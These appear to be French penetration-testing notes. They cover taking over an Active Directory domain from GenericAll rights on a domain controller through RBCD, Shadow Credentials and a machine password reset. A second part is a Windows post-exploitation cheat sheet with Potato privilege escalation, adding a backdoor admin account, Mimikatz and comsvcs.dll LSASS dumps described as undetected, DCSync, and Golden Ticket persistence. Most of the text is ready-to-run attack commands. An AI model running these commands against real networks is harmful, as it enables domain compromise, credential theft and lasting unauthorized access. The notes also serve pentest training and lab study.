![[IMG-20260512155454123.png]]


> **Contexte** : compte SPN compromis → membre du groupe `BENE GESSERIT` → `GenericAll` sur `ARRAKIS.IMPERIUM.LOCAL` (DC)


![[IMG-20260512155454789.png]]

---

## Pourquoi GenericAll sur un DC = Domain Admin

`GenericAll` donne le contrôle total sur l'objet AD ciblé. Sur un **compte machine de DC**, cela permet :

- d'écrire des attributs sensibles (`msDS-KeyCredentialLink`, `msDS-AllowedToActOnBehalfOfOtherIdentity`)
- de forcer un changement de mot de passe
- d'obtenir in fine un accès en tant que `ARRAKIS$`

Le compte machine d'un DC possède nativement les droits **DS-Replication-Get-Changes** et **DS-Replication-Get-Changes-All**, ce qui permet un **DCSync** — dump complet de NTDS.dit.

> **Règle d'or** : celui qui contrôle le DC contrôle le domaine.

---

## Attaque 1 — RBCD (Resource-Based Constrained Delegation)

### Principe

Convaincre le DC qu'une machine qu'on contrôle (`FAKE$`) est autorisée à s'impersonifier n'importe quel utilisateur auprès de lui. On écrit l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` sur `ARRAKIS$` grâce à `GenericAll`.

### Schéma

![[IMG-20260512155455799.png]]

### Étapes

**Étape 1 — Créer un compte machine contrôlé**

On crée `FAKE$` dans le domaine (possible si `MachineAccountQuota > 0`, valeur par défaut = 10).

```bash
addcomputer.py -computer-name 'FAKE' -computer-pass 'P@ss123!' \
  IMPERIUM.LOCAL/user:password
```

**Étape 2 — Écrire l'attribut de délégation sur le DC**

Grâce à `GenericAll`, on écrit `msDS-AllowedToActOnBehalfOfOtherIdentity` sur `ARRAKIS$` pour y référencer `FAKE$`. Le DC acceptera désormais que `FAKE$` s'impersonne n'importe qui auprès de lui.

```bash
rbcd.py -f FAKE -t ARRAKIS -dc-ip <IP_DC> IMPERIUM/user:password
```

**Étape 3 — S4U2Self : ticket "au nom d'Administrator"**

`FAKE$` demande au KDC un TGS pour lui-même en se faisant passer pour Administrator. Le KDC émet un ticket utilisable pour S4U2Proxy.

**Étape 4 — S4U2Proxy : accès au DC en tant qu'Administrator**

On obtient un ST valide pour `cifs/ARRAKIS.IMPERIUM.LOCAL` en tant qu'Administrator. Le DC valide car `FAKE$` est dans sa liste de délégation.

```bash
getST.py -spn cifs/ARRAKIS.IMPERIUM.LOCAL \
  -impersonate Administrator \
  IMPERIUM.LOCAL/FAKE$:P@ss123!
```

**Étape 5 — DCSync**

```bash
export KRB5CCNAME=Administrator.ccache

secretsdump.py -k -no-pass \
  IMPERIUM.LOCAL/Administrator@ARRAKIS.IMPERIUM.LOCAL
```

### Pourquoi ça donne DA ?

Le protocole Kerberos fait confiance au DC cible pour définir qui peut déléguer. En écrivant `msDS-AllowedToActOnBehalfOfOtherIdentity`, on court-circuite le modèle de sécurité : le KDC émet un ticket valide pour Administrator sur le DC, suffisant pour DCSync.

|Prérequis|Impact AD|Détection|Réversible|
|---|---|---|---|
|MachineAccountQuota > 0|Faible|Modérée|Oui|

---

## Attaque 2 — Shadow Credentials ⭐ (recommandée)

### Principe

Ajouter une clé cryptographique (certificat) dans l'attribut `msDS-KeyCredentialLink` du DC. On s'authentifie ensuite via **PKINIT** (Kerberos + certificat) **sans connaître le vrai mot de passe** du compte machine.

### Schéma


![[IMG-20260512155455850.png]]

### Étapes

**Étape 1 — Générer un certificat et l'injecter dans le DC**

Whisker génère une paire de clés RSA locale, puis écrit la clé publique dans `msDS-KeyCredentialLink` de `ARRAKIS$` via `GenericAll`.

```bash
# Windows
Whisker.exe add /target:ARRAKIS$ /domain:IMPERIUM.LOCAL /dc:ARRAKIS.IMPERIUM.LOCAL

# Linux
pywhisker.py -d IMPERIUM.LOCAL -u user -p password \
  --dc-ip $IP --target ARRAKIS$ --action add
```

> Whisker affiche un certificat en base64 et un mot de passe → les conserver pour l'étape suivante.

**Étape 2 — S'authentifier via PKINIT**

```bash
# Windows
Rubeus.exe asktgt /user:ARRAKIS$ /certificate:<base64> \
  /password:<pwd> /domain:IMPERIUM.LOCAL /nowrap

# Linux
gettgtpkinit.py -dc-ip $IP -cert-pfx fichier.pfx -pfx-pass password IMPERIUM.LOCAL/ARRAKIS$ arrakis.ccache
```

**Étape 3 — Extraire le hash NT du compte machine**

Le TGT permet de demander un U2U TGS contenant le PAC chiffré par la clé de session, dont on peut extraire le hash NT — **sans jamais connaître le vrai mot de passe**.

```bash
export KRB5CCNAME=arrakis.ccache

python3 getnthash.py IMPERIUM.LOCAL/ARRAKIS$ -key <session_key> -dc-ip $IP
```

**Étape 4 — DCSync**

```bash
secretsdump.py \
  -hashes :<NT_hash_ARRAKIS$> \
  IMPERIUM.LOCAL/ARRAKIS$@ARRAKIS.IMPERIUM.LOCAL \
  -just-dc
```

### Pourquoi ça donne DA ?

`ARRAKIS$` est un DC → il possède nativement les droits de réplication. En s'authentifiant en son nom (via PKINIT), on hérite de `DS-Replication-Get-Changes-All` et on peut DCSync l'intégralité de NTDS.dit.

|Prérequis|Impact AD|Détection|Réversible|
|---|---|---|---|
|PKINIT actif sur le DC|Minimal (1 attribut)|Faible|Oui (supprimer la clé)|

---

## Attaque 3 — Reset du mot de passe machine

### Principe

`GenericAll` inclut `User-Force-Change-Password`. On force un nouveau mot de passe sur `ARRAKIS$` **sans connaître l'ancien**, puis on s'authentifie directement avec ce nouveau mot de passe.

### Schéma

![[IMG-20260512155455992.png]]

### Étapes

**Étape 1 — Forcer le nouveau mot de passe**

```bash
# Windows (PowerView)
Set-DomainUserPassword -Identity ARRAKIS$ \
  -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)

# Linux
net rpc password ARRAKIS$ 'Newp@ss123!' \
  -U IMPERIUM/user%password -S <IP_DC>
```

**Étape 2 — DCSync direct**

```bash
secretsdump.py \
  IMPERIUM.LOCAL/ARRAKIS$:'Newp@ss123!'@ARRAKIS.IMPERIUM.LOCAL \
  -just-dc
```

### Pourquoi ça donne DA ?

Même logique que Shadow Credentials : `ARRAKIS$` est un DC avec les droits de réplication. Une fois son mot de passe changé, on s'y connecte directement et on DCSync.

> ⚠️ **Impact opérationnel** : changer le mot de passe d'un compte machine DC **casse immédiatement toutes les sessions Kerberos** qui utilisent ce compte. Très visible dans les SIEM, déconseillé en pentest réel.

|Prérequis|Impact AD|Détection|Réversible|
|---|---|---|---|
|Aucun|Élevé|Très haute|Difficile|
## Outils de référence

|Outil|Usage|
|---|---|
|`rbcd.py` (impacket)|Écriture msDS-AllowedToActOnBehalfOfOtherIdentity|
|`getST.py` (impacket)|Requête S4U2Self + S4U2Proxy|
|`Whisker.exe` / `pywhisker.py`|Injection de clé dans msDS-KeyCredentialLink|
|`Rubeus.exe`|PKINIT, S4U, Pass-the-Ticket|
|`gettgtpkinit.py` (PKINITtools)|TGT via certificat (Linux)|
|`getnthash.py` (PKINITtools)|Extraction hash NT depuis PAC|
|`secretsdump.py` (impacket)|DCSync / dump NTDS.dit|
|`addcomputer.py` (impacket)|Création compte machine|

# # Windows — Privilege Escalation & Post-Exploitation


## 1. Reconnaissance initiale (dès l'obtention d'un shell)

```cmd
whoami /all          ; compte, groupes, privilèges
systeminfo           ; OS, domaine, hotfixes
ipconfig /all        ; réseau, DNS (→ souvent pointe vers le DC)
net user             ; comptes locaux
net localgroup administrators
net group "Domain Admins" /domain
nltest /dclist:<domain>
echo %logonserver%
```

**Ce qu'on cherche :**

- `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` → Potato attacks
- Compte de service IIS/SQL → souvent surprivilégié
- Admins locaux qui sont aussi comptes de domaine

---

## 2. Privilege Escalation — SeImpersonatePrivilege

> Cas typique : shell IIS (`IIS AppPool\DefaultAppPool`), SQL Server, etc.

### Outil recommandé selon l'OS

|OS|Outil|
|---|---|
|Windows Server 2019 / Win 10+|**PrintSpoofer** ou **GodPotato**|
|Windows Server 2016 / Win 8-10|**JuicyPotato**|
|Tous|**GodPotato** (le plus universel)|

### PrintSpoofer

```cmd
PrintSpoofer64.exe -i -c "cmd.exe"
PrintSpoofer64.exe -i -c "whoami"
; Objectif : obtenir NT AUTHORITY\SYSTEM
```

### GodPotato

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"
```

**Upload via SMB** si accès au webroot :

 ```bash
 smbclient //<IP>/<share> -U "guest" --no-pass
 put PrintSpoofer64.exe
 put mimikatz.exe
 ```

---

## 3. Dump de credentials avec Mimikatz

> Nécessite un shell **SYSTEM** ou **Administrator** avec `privilege::debug`

### Commandes principales

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

### Ce que chaque module donne

|Module|Résultat|
|---|---|
|`sekurlsa::logonpasswords`|Hash NTLM + passwords en clair des sessions actives|
|`lsadump::sam`|Hashes des comptes locaux (SAM)|
|`lsadump::dcsync /domain:<dom> /all`|Tous les hashes du domaine (depuis un DA)|
|`sekurlsa::tickets`|Tickets Kerberos en mémoire|
|`kerberos::list /export`|Export des tickets .kirbi|

### Méthode alternative si AV bloque mimikatz — dump LSASS natif

```cmd
; Récupérer le PID de lsass
tasklist | findstr lsass

; Dump avec comsvcs.dll (100% natif Windows, non détecté)
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\windows\temp\lsass.dmp full
```

Puis analyser depuis Exegol :

```bash
pypykatz lsa minidump lsass.dmp
```

---

## 5. Post-exploitation DC — DCSync

Une fois admin sur le DC, dump de **tous les hashes du domaine** :

```bash
impacket-secretsdump -hashes :<NThash> <DOMAIN>/<user>@<DC_IP>

; Ou depuis un shell sur le DC avec mimikatz :
mimikatz.exe "lsadump::dcsync /domain:<domain> /all /csv" "exit"

; Hash krbtgt uniquement (pour Golden Ticket) :
mimikatz.exe "lsadump::dcsync /domain:<domain> /user:krbtgt" "exit"
```

---

## 6. Persistance — Golden Ticket

Avec le hash de `krbtgt` :

```cmd
; Dans mimikatz sur le DC
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /ptt
; /ptt = inject directement en mémoire

; Vérifier
klist
```

Depuis Exegol :

```bash
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<DC_hostname>
```



